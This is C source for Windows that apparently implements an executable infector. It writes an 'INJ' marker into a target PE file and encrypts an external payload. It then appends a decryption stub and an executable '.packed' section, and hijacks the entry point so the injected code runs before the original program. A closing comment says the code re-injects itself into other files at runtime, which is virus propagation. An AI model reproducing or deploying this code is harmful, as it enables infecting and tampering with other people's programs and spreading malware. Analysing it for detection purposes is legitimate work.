#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

#define NEW_SECTION_NAME ".packed"
#define NEW_SECTION_SIZE 0x1000  // 4KB for the new section


void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
{
    for (DWORD i = 0; i < len; i += 1)
        dst[i] = src[i];
}

//__declspec(code_seg("injected"))
int add_section(BYTE *fileData, char *data, DWORD size) {

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileData + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    WORD numberOfSections = ntHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeader[numberOfSections];

    // Set new section name
    strncpy((char*)newSectionHeader->Name, NEW_SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);

    // Calculate new section attributes
    DWORD newSectionVirtualAddress = sectionHeader[numberOfSections - 1].VirtualAddress + sectionHeader[numberOfSections - 1].Misc.VirtualSize;
    newSectionVirtualAddress = (newSectionVirtualAddress + 0xFFF) & ~0xFFF;  // Align to 4KB
    DWORD newSectionPointerToRawData = ((sectionHeader[numberOfSections - 1].PointerToRawData + sectionHeader[numberOfSections - 1].SizeOfRawData) + 0xFFF) & ~0xFFF;

    // Fill new section header
    newSectionHeader->Misc.VirtualSize = NEW_SECTION_SIZE;
    newSectionHeader->VirtualAddress = newSectionVirtualAddress;
    newSectionHeader->SizeOfRawData = NEW_SECTION_SIZE;
    newSectionHeader->PointerToRawData = newSectionPointerToRawData;
    newSectionHeader->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

    //pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;*/

    // Update NT headers
    ntHeaders->FileHeader.NumberOfSections += 1;
    ntHeaders->OptionalHeader.SizeOfImage = newSectionVirtualAddress + NEW_SECTION_SIZE;

    
    my_memcpy(fileData + newSectionPointerToRawData, data, size);
    /*printf("DUMP DATATATATAT::: %d\n", size);
    for (int i=0; i<size; i++)
        printf("%X ", ((PUCHAR)data)[i]);
    printf("\n");*/

    newSectionHeader->Misc.VirtualSize = size;
    newSectionHeader->SizeOfRawData = size;
    newSectionHeader->PointerToRawData = newSectionPointerToRawData;

    return 0;
}




int main(int ac, char **av)
{
    if (ac != 2)
    {
        printf("Usage: %s EXEFILE\n", av[0]);
        return 2600;
    }
    
    extern void payload();
    extern char __begin_of_code;
    extern ULONGLONG __end_of_code;
    extern char __begin_decrypt;
    extern ULONGLONG __end_decrypt;
    // j'ecris un truc qui chiffre _begin_of_code  qui sera injecté à la fin
    // routine de déchiffrement
    printf("FUNC %p \n", payload);
    printf("FUNC begin_code %p \n", (PUCHAR) &__begin_of_code);
    printf("FUNC end_code %p \n", (PUCHAR) &__end_of_code);
    //char payload[] = {0xcc, 0x90};
    //DWORD nb_add = sizeof (payload);
    DWORD nb_add = ((PUCHAR) &__end_of_code - (PUCHAR) &__begin_of_code) + sizeof(ULONGLONG);
    DWORD decrypt_seg_size = ((PUCHAR) &__end_decrypt - (PUCHAR) &__begin_decrypt) + sizeof(ULONGLONG);
    DWORD old_protect;
    VirtualProtect(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);
    __end_of_code = nb_add;
    printf("DUMP::: %d\n", nb_add);
    for (int i=0; i<nb_add; i++)
        printf("%X ", ((PUCHAR)payload)[i]);
    printf("\n");

    //encrypt 
   

    extern void decryption();
    extern void first_stage();
    //extern LONGLONG second_stage;
    extern LONGLONG decrypt_code;
    extern char __begin_decrypt;
    extern DWORD size_code;
    extern DWORD decrypt_segment_size;
    //to_c_code =
    VirtualProtect(&decrypt_code, sizeof(decrypt_code), PAGE_READWRITE, &old_protect);
    decrypt_code =  (PUCHAR)decryption - &__begin_decrypt;
    VirtualProtect(&size_code, sizeof(size_code), PAGE_READWRITE, &old_protect);
    size_code = nb_add;
    VirtualProtect(&decrypt_segment_size, sizeof(decrypt_segment_size), PAGE_READWRITE, &old_protect);
    decrypt_segment_size = decrypt_seg_size;

    printf("DUMP::: %d\n", decrypt_seg_size);
   


    char *thefile = av[1];
    HANDLE hFile = CreateFileA(
            thefile,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
            );
#if DEBUG
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();

        printf("Erreur CreateFileA %d\n", err);
        return err;
    }
#endif
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + NEW_SECTION_SIZE + nb_add;
    HANDLE hMapFile = CreateFileMapping(
                hFile,
                NULL,
                PAGE_READWRITE,
                0,
                dwNewFileSize,
                NULL
            );
#if DEBUG
    if (hMapFile == NULL)
    {
        DWORD err = GetLastError();

        printf("Erreur CreateFileMapping %d\n", err);
        return err;
    }
#endif
    LPVOID lpMapAdr = MapViewOfFile(
                hMapFile,
                FILE_MAP_ALL_ACCESS,
                0,
                0,
                0 // dwFileSize
            );
#if DEBUG
    if (lpMapAdr == NULL)
    {
        DWORD err = GetLastError();

        printf("Erreur MapViewOfFile %d\n", err);
        return err;
    }
#endif

    // LIST PE HEADER
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
#if DEBUG
    printf("DOS SIG %c%c\n", ((char*)&pDosHeader->e_magic)[0], ((char*)&pDosHeader->e_magic)[1]);
    printf("DOS next %d\n", pDosHeader->e_lfanew);
#endif
    //SIGNATURE 
    memcpy((void*)&pDosHeader->e_res2[8], "INJ\x00", 4);
    //*((&pDosHeader->e_res2[8]) - 0x2) = nb_add;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    //printf("NT SIG %c%c\n", ((char*)&pNtHeader->Signature)[0], ((char*)&pNtHeader->Signature)[1]);
    char *sig = (char*)&pNtHeader->Signature;
    printf("NT SIG %s\n", sig);
    printf("NT Machine %#02X\n", pNtHeader->FileHeader.Machine);

    // Optional Header
    printf("Optional SizeOfCode %#08X\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("Optional AOEP %#08X\n", pNtHeader->OptionalHeader.AddressOfEntryPoint);
    printf("Optional ImageBase %#016llX\n", pNtHeader->OptionalHeader.ImageBase);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));

    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    printf("Section Name: %s\n", pSection[idxSection].Name);
    printf("Virtual Adr: %#08X\n", pSection[idxSection].VirtualAddress);
    printf("Virtual Size: %d\n", pSection[idxSection].Misc.VirtualSize);
    printf("PointerRawData Adr: %#08X\n", pSection[idxSection].PointerToRawData);
    printf("Size Of Raw Data: %d\n", pSection[idxSection].SizeOfRawData);
    printf("Size Of headers: %d\n", pNtHeader->OptionalHeader.SizeOfHeaders);
    int is_exec = (pSection[idxSection].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    printf("is exec %d\n", is_exec);

    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;
    
    DWORD old_EP =  pNtHeader->OptionalHeader.AddressOfEntryPoint;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;
    extern ULONGLONG delta_d;
    delta_d = (LONGLONG)old_EP - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
    extern LONGLONG to_c_code;
    extern void inj_code_c();
    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;

    encryption((PVOID)&__begin_of_code, nb_add);
    printf("DUMP ENCRYPTED::: %d\n", nb_add);
    for (int i=0; i<nb_add; i++)
        printf("%X ", ((PUCHAR)payload)[i]);
    printf("\n");

    /*my_memcpy(dstPtr, (PUCHAR)payload, nb_add);
    pSection[idxSection].Misc.VirtualSize += nb_add;
    pSection[idxSection].SizeOfRawData += nb_add;
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;*/
    
    my_memcpy(dstPtr, (PUCHAR)first_stage, decrypt_seg_size);
    //my_memcpy(dstPtr+decrypt_seg_size+0x10, (PUCHAR)payload, nb_add);
    
    pSection[idxSection].Misc.VirtualSize += decrypt_seg_size;
    pSection[idxSection].SizeOfRawData += decrypt_seg_size;
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE; 

    printf("Section Name: %s\n", pSection[idxSection].Name);
    printf("Virtual Adr: %#08X\n", pSection[idxSection].VirtualAddress);
    printf("Virtual Size: %d\n", pSection[idxSection].Misc.VirtualSize);
    printf("PointerRawData Adr: %#08X\n", pSection[idxSection].PointerToRawData);
    printf("Size Of Raw Data: %d\n", pSection[idxSection].SizeOfRawData);
    printf("Size Of headers: %d\n", pNtHeader->OptionalHeader.SizeOfHeaders);  
    DWORD size = pSection[idxSection].SizeOfRawData - (pNtHeader->OptionalHeader.AddressOfEntryPoint - pSection[idxSection].VirtualAddress); // - (DWORD)((PUCHAR)(  pSection[idxSection].PointerToRawData) - (PUCHAR)( pNtHeader->OptionalHeader.AddressOfEntryPoint));
    printf("Size Of headers: %x\n", size); 
    //pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;

    BYTE* fileData = (BYTE*)lpMapAdr;
    add_section(fileData, &__begin_of_code, nb_add);

    //LPVOID packedSectionPtr = (LPVOID)((BYTE*)lpMapAdr + pSection[pNtHeader->FileHeader.NumberOfSections-1].VirtualAddress);
    //VirtualProtect(&second_stage, sizeof(second_stage), PAGE_READWRITE, &old_protect);
    //second_stage =  packedSectionPtr;


   



	//memset( (PVOID)((UINT_PTR)lpMapAdr + newSectionHeader->PointerToRawData), 0, newSectionHeader->SizeOfRawData);




    FlushViewOfFile(lpMapAdr, dwNewFileSize);
    UnmapViewOfFile(lpMapAdr);
    CloseHandle(hFile);
}


// au runtime on se reinjecte dans une autre section dans un autre fichier